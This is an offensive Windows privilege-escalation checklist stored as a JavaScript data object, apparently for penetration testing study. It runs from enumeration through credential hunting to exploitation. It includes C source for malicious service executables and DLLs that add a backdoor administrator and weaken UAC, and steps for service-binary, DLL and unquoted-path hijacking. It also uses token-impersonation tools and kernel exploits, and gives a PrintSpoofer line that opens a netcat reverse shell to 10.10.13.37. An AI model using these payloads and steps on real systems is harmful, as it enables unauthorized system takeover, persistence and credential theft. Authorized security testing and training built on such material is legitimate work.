checklist["windows_privesc"] = [
    {
        chapter: "1. situational awareness & Strategy",
        checks: [
            {
                title: "User context & privileges",
                description: "Identify your current user context, privileges, and group memberships",
                code: `# 1. check who you are on the system, check your privileges, check your groups
whoami
whoami /priv
whoami /groups

# 2. exisiting users and groups on the system
Get-LocalUser # net user
Get-LocalUser $($env:USERNAME)

# groups
Get-LocalGroup # net localgroup
Get-LocalGroup <GROUPNAME>

# users who are in a specific group 
Get-LocalGroupMember <GROUPNAME>  # net localgroup <GROUPNAME>

# 3. check your environment variables
cmd /c "set"`,
                code_language: powershell,
            },
            {
                title: "OS, version and architecture",
                description: "Identify OS version, architecture, and missing patches to determine applicable exploits",
                code: `# 1. gather information about the system
systeminfo

# 2. gather specific information about the system 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# > for release info - google: release date 10.0.22621 N/A Build 22621 wikipedia

# 3. gather information about installed patches
wmic qfe

# 4. filter on most important columns
wmic qfe get Caption,Description,HotFixID,InstalledOn`,
                code_language: powershell,
            },
            {
                title: "Network configuration & connections",
                description: "Map network topology, active connections, and identify potential pivot points",
                code: `# 1. DHCP, DNS, MAC address, default gateway
ipconfig
ipconfig /all

# 2. gather information about the arp table
arp -a

# 3. show routes to another network
route print

# 4. show all active connections with there related PID and process name
"{0,-8}{1,-25}{2,-25}{3,-15}{4,-8}{5,-20}{6,-30}{7}" -f "Proto","LocalAddress","ForeignAddress","State","PID","ProcessName","Description","Path"; netstat -ano | findstr /i listening | % { $p=$_.Split()[-1]; $proc=Get-Process -Id $p -EA SilentlyContinue; $l=$_ -split '\\s+'; "{0,-8}{1,-25}{2,-25}{3,-15}{4,-8}{5,-20}{6,-30}{7}" -f $l[1],$l[2],$l[3],$l[4],$p,$proc.ProcessName,$proc.Description,$proc.Path }`,
                code_language: powershell,
            },
            {
                title: "Installed applications",
                description: "Display installed applications ",
                code: `# 1. list installed applications
# 1. 64-bit applications
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,InstallLocation
dir "c:\\program files\\"

# 2. 32-bit applications 
Get-ItemProperty "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,InstallLocation
dir "c:\\program files (x86)\\"

# 3. check the downloads & documents folder of the current user
dir C:\\Users\\$($env:USERNAME)\\Downloads
dir C:\\Users\\$($env:USERNAME)\\Documents`,
                code_language: powershell,
            },
            {
                title: "Security controls (AV, EDR, Firewall)",
                description: "Identify security products and firewall rules that may detect or block your activities",
                code: `# show the services running
sc.exe queryex type= service

# show a specific service running
sc.exe query windefend

# view on what ports you can connect to the host or get a connection back
$profiles=netsh advfirewall show allprofiles|Select-String "Policy";$defaultAllow=$profiles-match'AllowOutbound';$allow=@{TCP=@();UDP=@()};$block=@{TCP=@();UDP=@()};Get-NetFirewallRule -Enabled True -Direction Outbound -EA Silent|%{$p=$_|Get-NetFirewallPortFilter -EA Silent;if($p.Protocol-match'TCP|UDP'){$lp=$p.RemotePort-replace'\\s+',',';if($_.Action-eq'Allow'){$allow[$p.Protocol]+=$lp}else{$block[$p.Protocol]+=$lp}}};'TCP','UDP'|%{$proto=$_;$a=$allow[$proto]|Sort-Object -Unique;$b=$block[$proto]|Sort-Object -Unique;$hasAny=$a-contains'Any';$out=if($defaultAllow-or$hasAny){if($b){"All except $($b-join', ')"}else{"All ports"}}else{if($a-and!$hasAny){($a|?{$_-ne'Any'})-join', '}else{"None"}};"{0}: {1}"-f$proto,$out}

# legacy (deprecated, may not work on modern Windows)
# netsh firewall show state
# netsh firewall show config`,
                code_language: "powershell",
            },
            {
                title: "Storage enumeration & network shares/ mapped drives",
                description: "Identify drives and network shares for additional attack surface",
                code: `# 1. list all physical disks
Get-PhysicalDisk

# 2. list all partitions on the system
get-partition

# 3. list shared folders with permissions
Get-SmbShare | Select Name, Path, Description
Get-SmbShareAccess -Name <SHARENAME>`,
                code_language: powershell,
            },
        ]
    },
    {
        chapter: "2. Escalation path: sensitive files & credentials",
        checks: [
            {
                title: "Search for sensitive filenames, keywords and extensions",
                description: "Search for sensitive files",
                code: `# 1. check common user-specific locations for sensitive files
dir C:\\Users\\$($env:USERNAME)\\AppData\\Roaming # alternative: dir $env:APPDATA

# 2. common credential file locations (instant - no recursion)
'C:\\inetpub\\wwwroot\\web.config','C:\\Windows\\Panther\\unattend.xml','C:\\Windows\\Panther\\Unattend\\unattend.xml','C:\\Windows\\System32\\sysprep\\sysprep.xml' | ?{Test-Path $_} | %{"[+] $_"}
                
# 3. filename match (fast - no file content reading)
gci C:\\ -Recurse -File -EA Silent | ?{$_.FullName -notmatch "\\\\Windows\\\\|\\\\Program Files"} | ?{$_.Name -match "password|passwd|credential|secret|config|backup|unattend|sysprep|\\.kdbx$|\\.env$"} | select FullName

# 4. content search - only small text-based files (skips binaries and large files)
gci C:\\ -Recurse -File -EA Silent | ?{$_.FullName -notmatch "\\\\Windows\\\\|\\\\Program Files" -and $_.Length -lt 500KB -and $_.Extension -match "\\.(txt|ini|xml|conf|config|json|yaml|yml|ps1|bat|cmd|log|env|csv|php|asp|aspx)$"} | sls "password|passwd|credential|secret|connectionstring" -List -EA Silent | select Path

# 5. interesting file extensions (single scan)
gci C:\\ -Recurse -File -Include *.kdbx,*.pcap,*.cap,*.bak,*.rdp,*.pfx,*.p12,*.key,*.pem -EA Silent | ?{$_.FullName -notmatch "\\\\Windows\\\\"} | select FullName
`,
                code_language: powershell,
            },
            {
                title: "Powershell history/ transcripts ",
                description: "Retrieve sensitive information from Powershell history/ transcripts",
                code: `# 1. get the command history
Get-History

# 2. retrieve the PSReadline history file and look for sensitive information
(Get-PSReadlineOption).HistorySavePath
type (Get-PSReadlineOption).HistorySavePath

# 3. search for passwords in the event viewer (script-block)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |  Format-List TimeCreated, Id, Message | Out-File -FilePath ".\\PS_ScriptBlock_EventLog.txt"

# 4. search for transcript files
Get-ChildItem -Path C:\\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
`,
                code_language: powershell,
            },
            {
                title: "Powershell history/ transcripts",
                description: "Retrieve sensitive information from Powershell history/ transcripts",
                code: `# 1. get the command history
Get-History

# 2. retrieve the PSReadline history file and look for sensitive information
(Get-PSReadlineOption).HistorySavePath
type (Get-PSReadlineOption).HistorySavePath

# 3. search for passwords in the event viewer (script-block)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |  Format-List TimeCreated, Id, Message | Out-File -FilePath ".\\PS_ScriptBlock_EventLog.txt"

# 4. search for transcript files
Get-ChildItem -Path C:\\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
`,
                code_language: powershell,
            },
            {
                title: "Alternate Data Streams (ADS) - find hidden data",
                description: "Search for Alternate Data Streams (ADS) that might contain hidden data",
                code: `# 1. List all files with an ADS, from a specific directory
powershell -c "gci C:\\ -r -file -ea 0 2>$null|%{gi $_.FullName -Stream * -ea 0 2>$null|?{$_.Stream -ne ':$DATA'}|select FileName,PSChildName} 2>$null"

# 2. read the file with an ADS
more < filename:adsname

##### OPTIONAL               
# 3. list file with ADS (within the same directory)
dir /r

# 4. - optional create an file with an ADS
echo "Hidden data" > normalfile.txt:hiddenstream.txt

# 5. list the content of the file with an ADS
more < normalfile.txt:hiddenstream.txt`,
                code_language: powershell,
            }
        ]
    },
    {
        chapter: "3. Escalation path: Windows services & scheduled tasks",
        checks: [
            {
                title: "Escalation via 'service binary hijacking'",
                description: "replace the binary of a service, running as NT Authority/system, but that you can control also",
                code: `##### REQUIREMENTS:
# - You have privileges over an existing service executable (write permissions) OR
# - You have privileges over the folder containing the service executable (write permissions)
# - you can restart the service or restart the machine

##### DESCRIPTION:
# You can replace a service binary with a malicious one, by doing so when the service is restarted, it will execute your malicious binary with SYSTEM privileges.

##### NOTE:
# When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

##### START EXPLOITATION

# 1A. evil-winrm enchanced version
$results=@(); Get-ItemProperty "registry::HKLM\\System\\CurrentControlSet\\Services\\*" | Where-Object {$_.ImagePath -and $_.ImagePath -notmatch "system32|sysWOW64"} | ForEach-Object { $svc=$_.PSChildName; $bin=($_.ImagePath -replace '"','') -split '\\s+[-/]' | Select -First 1; $bin=$bin.Trim(); $runAs=if($_.ObjectName){$_.ObjectName}else{"LocalSystem"}; $canRestart=$false; $sd=(sc.exe sdshow $svc 2>$null)|?{$_ -match '^D:'};$sd=$sd-join''; [regex]::Matches($sd,'\\(A;;([^;]*?);;;(BU|WD|AU|IU)\\)') | %{ $rights=$_.Groups[1].Value; if($rights -match 'RP' -and $rights -match 'WP'){$canRestart=$true} }; $writable=$false; if(Test-Path $bin -EA Silent){$acl=icacls $bin 2>$null|Out-String; if($acl -match 'BUILTIN\\\\Users.*(F|M|W)|Everyone.*(F|M|W)|Authenticated Users.*(F|M|W)'){$writable=$true}}; $results+=[PSCustomObject]@{Service=$svc;RunAs=$runAs;Path=$bin;CanRestart=$canRestart;Writable=$writable} }; $results | Format-Table -AutoSize; $exploitable=($results|?{$_.CanRestart -or $_.Writable}).Count; if($exploitable){"[+] $exploitable exploitable service(s) found!"}else{"[-] No exploitable services found"}

# 1B. manual: Identify services running (permissions required - interactive logon such as RDP)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object { $_.PathName -notlike 'C:\\Windows\\System32*' }

# 1C. manual: Identify services running (Alternative without extra permissions - utilizing get-process with get-childitem)
Get-Process | Select-Object -ExpandProperty ProcessName -Unique | ? { $_ -notmatch "^(svchost|csrss|wininit|services|lsass|smss|winlogon|spoolsv|dwm|dllhost|taskhostw|sihost|RuntimeBroker|explorer|ctfmon|conhost|fontdrvhost|MsMpEng|NisSrv|WmiPrvSE|System|Idle|audiodg|SearchIndexer|cmd|powershell)$" } | % { $proc=$_; $found=Get-ChildItem -Path (Get-ChildItem C:\\ -Directory | ? { $_.Name -notmatch "^(Windows|PerfLogs|\\$Recycle\\.Bin|System Volume Information)$" }).FullName -Recurse -Include "$proc.exe" -EA 0 | Select-Object -First 1; if ($found) { [PSCustomObject]@{Name=$proc; Path=$found.FullName} } }

# 1D. automated: Using PowerUp.ps1 (requires powershell execution policy to be bypassed) 
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
. .\\PowerUp.ps1 
Get-ModifiableServiceFile

# 2. retrieve the permissions of the service binary (F= full control, M= modify, RX= read & execute, R= read, W= write)
icacls.exe "C:\\Path\\to\\service.exe"

# 3. create a malicious payload, e.g.:
### --- START PAYLOAD --- ###
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user tempUserG DiffPword951 /add");
  i = system ("net localgroup Administrators tempUserG /add");
  i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
  
  return 0;
}
### --- END PAYLOAD --- ###
# COMPILE COMMAND:
x86_64-w64-mingw32-gcc payload.c -o payload.exe

# 4. transfer and replace the service binary with your malicious payload
copy payload.exe "C:\\Path\\to\\service.exe"

# 5. restart the service to execute your payload with SYSTEM privileges
# OPTION 1: restart service
sc.exe stop <SERVICENAME> # net stop <SERVICENAME>
sc.exe start <SERVICENAME> # net start <SERVICENAME>

# OPTION 2: restart the machine - check whoami /priv for 'SeShutdownPrivilege' privilege
shutdown /r /t 0

# 6. verify that your user has been added
Get-LocalGroupMember administrators

##### END EXPLOITATION`,
                code_language: powershell,
            },
            {
                title: "Escalation via 'DLL service hijacking'",
                description: "replace the binary of a service, running as NT Authority/system, but that you can control also",
                code: `##### REQUIREMENTS:
- You have privileges over an existing service DLL (write permissions)
- you can restart the service or restart the machine (or you want to wait for another user to start the app)

##### DESCRIPTION:
You can replace a service DLL with a malicious one, by doing so when the service is (re)started, it will execute your malicious DLL with high-level privileges.

##### START EXPLOITATION

# 1. identify installed applications on the system
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,InstallLocation
Get-ItemProperty "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,InstallLocation

# 2. copy over 'nttrace.exe' and 'nttrace.cfg' to the target machine (in the same directory)
# https://github.com/rogerorr/NtTrace/releases/tag/v1.1
nttrace.exe ../../../filezilla/INTERSTING_APP.exe > trace.txt 2>&1

# 3. filter the trace.txt for loaded DLLs (look for 'NtOpenSection' and 'NtQueryAttributesFile' after each other)
$k=(gp "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs").PSObject.Properties.Value-match'\\.dll$';$sys='(?i)(^api-ms-|^ext-ms-|MPR|NETAPI32|POWRPROF|IPHLPAPI|VERSION|UxTheme|OLEACC|WINMM|NETUTILS|BCRYPT|SRVCLI|NTASN1|UMPDC|MSASN1|msimg32|CFGMGR32|PROPSYS|Secur32|WININET|WTSAPI32|USERENV|SSPICLI|CRYPTBASE|ncrypt|profapi|msftedit|apphelp|iertutil|urlmon|CRYPT32|WLDAP32|imagehlp|DPAPI|WINTRUST|SHELL32|SHLWAPI|KERNELBASE|ntdll|kernel32|user32|advapi32|ole32|gdi32|comctl32|comdlg32|rpcrt4|msvcrt|ws2_32|sechost|setupapi|clbcatq|imagehlp)\\.dll';gc .\\trace.txt|?{$l=$_;$_ -match'\\.dll'-and$_ -match'NOT_FOUND|cannot find'-and$_ -notmatch'System32|SystemResources'-and$_ -notmatch$sys-and!($k|?{$l-match"(?i)\\b$_\\b"})}|select -Unique > trace_filtered.txt

# 4. create a malicious DLL (see example below) and name it as one of the missing DLL
move malicious.dll "C:\\Path\\to\\missing.dll"

# 5. restart the service, or wait for someone to start the application that loads the DLL
...

# 6. verify that your user has been added (if payload below is used)
net user

### - start MALICIOUS DLL payload - ###

#include <windows.h>
 
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        
        int i;
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_THREAD_DETACH: // A thread exits normally.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
    }
    return TRUE;
}

### - end MALICIOUS DLL payload - ###

# COMPILE COMMAND:
x86_64-w64-mingw32-gcc dll.cpp --shared -o output.dll

### - DLL Search order - ###
# the search order of DLLs is as follows: https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

##### END EXPLOITATION`,
                code_language: powershell,
            },
            {
                title: "Escalation via 'Unquoted Service Paths'",
                description: "When a service executable path is not enclosed in quotes, Windows attempts to execute every possible path segment before the space. This can lead to privilege escalation if you can place a malicious executable in one of these paths.",
                code: `##### REQUIREMENTS:
# - You have write permissions to one of the directories in the unquoted service path

##### REFERENCE:
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md

##### DESCRIPTION:
# Unquoted service paths occur when the service binary is defined without quotes in the registry. For example, if the service binary path is: "C:\\Program Files\\Some Folder\\Service.exe", Windows will attempt to run:
# C:\\Program.exe
# C:\\Program Files\\Some.exe
# C:\\Program Files\\Some Folder\\Service.exe

##### START EXPLOITATION

# 1. use PowerUp.ps1 to find unquoted service paths:
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
. .\\PowerUp.ps1
Get-ServiceUnquoted -Verbose

# 2. identify the hijackable paths (ones you have write permissions to), for example:
# ServiceName\t: GammaService
# Path\t\t\t: C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe
# ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=NT AUTHORITY\\Authenticated Users;
#\t\t\t\tPermissions=System.Object[]}
# StartName\t: LocalSystem
# AbuseFunction\t: Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
# CanRestart\t: True

# in this case, the path to the binary is 'C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe', which means Windows will attempt to run:
# C:\\Program.exe
# C:\\Program Files\\Enterprise.exe
# C:\\Program Files\\Enterprise Apps\\Current.exe
# C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe

# 3. place your malicious payload in one of the paths Windows will attempt to run:
copy shell.exe "C:\\Program Files\\Some.exe"

# 4A. start or restart the vulnerable service
sc start unquotedsvc

# 4B. or restart the machine - check whoami /priv for 'SeShutdownPrivilege' privilege
shutdown /r /t 0

##### END EXPLOITATION`,
                code_language: powershell,
            },
            {
                title: "Escalation via 'binary paths'",
                description: "Escalate privileges from a service, running as NT Authority/system, but that you can control also",
                code: `# Explanation:
# By identifying a service that runs as SYSTEM and allows you to modify its configuration, you can change the service's binary path to a file you control. When the service starts, it executes your chosen file with SYSTEM-level privileges, effectively escalating your privileges.
                
# 1. Download accesschk64.exe from Sysinternals:
# https://learn.microsoft.com/nl-nl/sysinternals/downloads/accesschk
# or directly from: https://live.sysinternals.com/accesschk.exe
# Transfer this binary onto the target Windows machine.

# 2. Use accesschk64 to find services writable by "Everyone" (OR THE GROUP YOU ARE PART OF):
accesschk64.exe -uwcv Everyone * /accepteula

# 3. Review the output. Look for any service entries that return with RW (Read/Write) permissions.
#    For example:
#    RW daclsvc
#          SERVICE_QUERY_STATUS
#          SERVICE_QUERY_CONFIG
#          ...
#          SERVICE_CHANGE_CONFIG  <--- This is crucial

#    If you see SERVICE_CHANGE_CONFIG permissions, you can potentially modify the service's binary path.

# check if you have sc or sc.exe installed
sc -h
sc.exe -h

# 4. Confirm the services current binary path:
sc qc <SERVICENAME>
sc.exe qc <SERVICENAME>

# This might return something like:
# BINARY_PATH_NAME: C:\\Program Files\\...\\daclsvc.exe

# 5. Change the services binary path to a payload of your choice (the space after the 'binpath= ' is correct!):
sc config daclsvc binpath= "C:\\Temp\\revshell.exe"

# Or a command
sc config daclsvc binpath= "net localgroup administrators <CURRENTUSER> /add"

# Note: Ensure "revshell.exe" (or your chosen executable) is present in the specified location. This may also be a shell command

# 6. Start the service, which will now execute your chosen binary or command with SYSTEM-level privileges:
sc start daclsvc       
`,
                code_language: powershell,
            },
            {
                title: "Escalation via 'scheduled tasks'",
                description: "Retrieve the running scheduled tasks, and analyze them",
                code: `# 1. basic command to retrieve all scheduled tasks with detailed information
# mind the following fields: Taskname, Next run time, Author, Task to run                
schtasks /query /fo LIST /v
 
# 2. search for scheduled tasks executing in the next 10 minutes
$now=Get-Date; $window=$now.AddMinutes(10); $results=Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | ForEach-Object { $info=$_ | Get-ScheduledTaskInfo; if($info.NextRunTime -and $info.NextRunTime -ge $now -and $info.NextRunTime -le $window){ $bin=$_.Actions.Execute; $args=$_.Actions.Arguments; $delta=$info.NextRunTime-$now; "\`n  [!] $($_.TaskName)\`n      Runs In:     $([math]::Floor($delta.TotalMinutes))m $($delta.Seconds)s\`n      Next Run:    $($info.NextRunTime.ToString('yyyy-MM-dd HH:mm:ss'))\`n      Binary:      $(if($bin){$bin}else{'(none)'})\`n      Arguments:   $(if($args){$args}else{'(none)'})\`n      Run As:      $(if($_.Principal.UserId){$_.Principal.UserId}else{'(none)'})\`n      Run Level:   $($_.Principal.RunLevel)\`n      Task Path:   $($_.TaskPath)" }}; if($results){$results}else{Write-Host "No tasks scheduled in the next 10 minutes."}

# 3. more comprehensive and user-friendly command to list all scheduled tasks that are in 'ready' or 'running' state.
### --- AFTER running the command, search in the file for the term 'WRITABLE!' --- ###
$out=".\\TaskAudit_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; $now=Get-Date; $cu=[System.Security.Principal.WindowsIdentity]::GetCurrent(); $cp=New-Object System.Security.Principal.WindowsPrincipal($cu); Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | ForEach-Object { $info=$_ | Get-ScheduledTaskInfo; $bin=$_.Actions.Execute; $fe=$bin -and (Test-Path $bin -ErrorAction SilentlyContinue); $acl=if($fe){Get-Acl $bin}else{$null}; $perms=if($acl){$acl.Access | ForEach-Object {"      - $($_.IdentityReference): $($_.FileSystemRights)"} | Out-String}else{'N/A'}; $sig=if($fe){(Get-AuthenticodeSignature $bin).SignerCertificate.Subject}else{'N/A'}; $hash=if($fe){(Get-FileHash $bin -Algorithm SHA256).Hash}else{'N/A'}; $wr=if($acl){($acl.Access | Where-Object {$_.FileSystemRights -match 'Write|FullControl|Modify' -and ($_.IdentityReference -eq $cu.Name -or $cp.IsInRole($_.IdentityReference))} | Measure-Object).Count -gt 0}else{$false}; $rd=if($info.LastRunTime){$now-$info.LastRunTime}else{$null}; $ds=if($rd){"$([math]::Floor($rd.TotalHours))h $($rd.Minutes)m $($rd.Seconds)s"}else{'N/A'}; $nr=if($info.NextRunTime){$info.NextRunTime-$now}else{$null}; $ns=if($nr -and $nr.TotalSeconds -gt 0){"in $([math]::Floor($nr.TotalDays))d $($nr.Hours)h $($nr.Minutes)m $($nr.Seconds)s"}elseif($nr){"OVERDUE by $([math]::Floor([math]::Abs($nr.TotalHours)))h $([math]::Abs($nr.Minutes))m $([math]::Abs($nr.Seconds))s"}else{'N/A'}; $desc=if($_.Description){if($_.Description.Length -gt 60){$_.Description.Substring(0,60)+'...'}else{$_.Description}}else{'(none)'}; $wt=if($wr){"[WRITABLE!]"}else{""}; $ws=if($wr){"YES - POTENTIAL PRIVESC!"}else{"No"}; "\`n  +==================================================================================+\`n  |  TASK: $($_.TaskName) $wt\`n  +==================================================================================+\`n\`n    [ GENERAL INFO ]\`n      Path:            $($_.TaskPath)\`n      State:           $($_.State)\`n      Author:          $(if($_.Author){$_.Author}else{'(none)'})\`n      Description:     $desc\`n\`n    [ EXECUTION ]\`n      Binary:          $(if($bin){$bin}else{'(none)'})\`n      Arguments:       $(if($_.Actions.Arguments){$_.Actions.Arguments}else{'(none)'})\`n      Working Dir:     $(if($_.Actions.WorkingDirectory){$_.Actions.WorkingDirectory}else{'(none)'})\`n      Run As:          $(if($_.Principal.UserId){$_.Principal.UserId}else{'(none)'})\`n      Run Level:       $($_.Principal.RunLevel)\`n\`n    [ TIMING ]\`n      Current Time:    $($now.ToString('yyyy-MM-dd HH:mm:ss'))\`n      Last Run:        $($info.LastRunTime)\`n      Running For:     $ds\`n      Next Run:        $(if($info.NextRunTime){$info.NextRunTime}else{'(not scheduled)'})\`n      Next Run In:     $ns\`n      Last Result:     $($info.LastTaskResult)\`n      Missed Runs:     $($info.NumberOfMissedRuns)\`n\`n    [ FILE SECURITY ]\`n      Owner:           $(if($acl){$acl.Owner}else{'N/A'})\`n      SHA256:          $hash\`n      Signature:       $(if($sig){$sig}else{'N/A'})\`n      Writable:        $ws\`n      Permissions:\`n$perms\`n  +----------------------------------------------------------------------------------+" } | Out-File -FilePath $out -Encoding UTF8; Write-Host "Saved: $out"
`,
                code_language: bash,
            },

        ]
    },
    {
        chapter: "4. Escalation path: WSL, Local exploits & automated tooling",
        checks: [
            {
                title: "winPEAS.exe",
                description: "winPEAS.exe script for local enumeration",
                code: `# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

# https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1                                        
# winPEAS using a powershell script
powershell -ep bypass -c ".\\winPEAS.ps1"

# https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
# winPEAS using a .exe file
.\\winPEASany_ofs.exe -h`,
                code_language: powershell,
            },
            {
                title: "PowerUp.ps1",
                description: "PowerUp.ps1 script for local enumeration",
                code: `# https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
                    
# bypass execution policy
powershell -ep bypass

# Load the 'Powerup' script into memory
. .\\Powerup.ps1

# execute checks (see git url for specific checks)
Invoke-AllChecks
`,
                code_language: powershell,
            },
            {
                title: "Windows-exploit-suggester.py",
                description: "Windows-exploit-suggester.py script for local enumeration",
                code: `# https://github.com/AonCyberLabs/Windows-Exploit-Suggester (python2)
# https://github.com/Pwnistry/Windows-Exploit-Suggester-python3.git (python3)
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database GENERATED_FILE.xlsx --systeminfo OUTPUT_WINDOWS_SYSTEMINFO.txt`,
                code_language: powershell,
            },
            {
                title: "Metasploit local exploit suggester",
                description: "Metasploit local exploit suggester step-by-step for local enumeration",
                code: `##### all commands are within metasploit #####
# After gaining a meterpreter session, background it: ctrl + z
# gather all active sessions
sessions

# use local exploit suggester & set session to session X
use post/multi/recon/local_exploit_suggester
set SESSION X

# RUN the exploit suggester
run`,
                code_language: powershell,
            },
            {
                title: "Metasploit kernel exploitation",
                description: "Use metasploit for kernel exploitation",
                code: `##### all commands are within metasploit #####
# After gaining a meterpreter session, background it: ctrl + z
# gather all active sessions
sessions

# use local exploit suggester & set session to session X
use post/multi/recon/local_exploit_suggester
set SESSION X

# RUN the exploit suggester
run

# check which exploits could potentially work and use a specific one, e.g. 
use exploit/windows/local/ms10_015_kitrap0d

# set the options
set session X

# run the exploit against the target
run`,
                code_language: bash,
            },
            {
                title: "Manual kernel exploitation",
                description: "Exploit kernels manually",
                code: ` # run windows exploit suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database GENERATED_FILE.xlsx --systeminfo OUTPUT_WINDOWS_SYSTEMINFO.txt

# retrieve pre-compiled exploits from
git clone https://github.com/SecWiki/windows-kernel-exploits

# run the exploit, as explained in the kernel-exploit directory
# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059`,
                code_language: bash,
            },
            {
                title: "Windows subsystem for Linux",
                description: "Check if you are in a environment that has WSL installed",
                code: `# navigate to the mountpoint of the wsl filesystem
cd C:\\Users\\$($env:USERNAME)\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\

# locate 'bash.exe' from C:\\ directory
dir /s bash.exe

# locate 'wsl.exe' from C:\\ directory
dir /s wsl.exe

# execute wsl.exe or bash.exe
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
`,
                code_language: bash,
            }
        ]
    },
    {
        chapter: "5. Escalation path: Token attacks & low-priv service accounts",
        // https://github.com/gtworek/Priv2Admino
        checks: [
            {
                title: "SeImpersonatePrivilege",
                description: "Check if the tokens you currently have, can be used to escalate privileges",
                code: `# 1. check your group & user tokens
whoami /priv

# 2. compare (enabled and disabled) tokens to the following github URL.
# https://github.com/gtworek/Priv2Admin

##### 1. SeImpersonatePrivilege
##### OPTION 1: GodPotato - affected versions: Windows Server 2012 - Windows Server 2022 / Windows 8 - Windows 11
# reference: https://github.com/BeichenDream/GodPotato

# 1. download the appropriate GodPotato version from: https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
...

# 2. execute GodPotato with the command you want to run as SYSTEM
.\\GodPotato-NET4.exe -cmd "cmd /c whoami"

# 3. add a user to the local administrators group & disable remote UAC restrictions
.\\GodPotato-NET4.exe -cmd "cmd /c net user tempUserG DiffPword951 /add";
.\\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators tempUserG /add";
.\\GodPotato-NET4.exe -cmd "cmd /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f";

##### OPTION 2: Printspoofer - affected versions: Windows 10 and Server 2016/2019.
# 1. download the printSpoofer exploit (64 or 32 bit)
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

# 2. execute printspoofer with the command you want to run as SYSTEM
PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -c "c:\\Temp\\nc.exe 10.10.13.37 1337 -e cmd"

##### OPTION 3: (before windows server 2019) JuicyPotato / SweetPotato
# reference : https://jlajara.gitlab.io/Potatoes_Windows_Privesc

# Search for correct potato exploitation. In this example: JuicyPotato.exe (Sweet potato will probably work aswell)

# 1. download JuicyPotato.exe : https://github.com/ohpe/juicy-potato
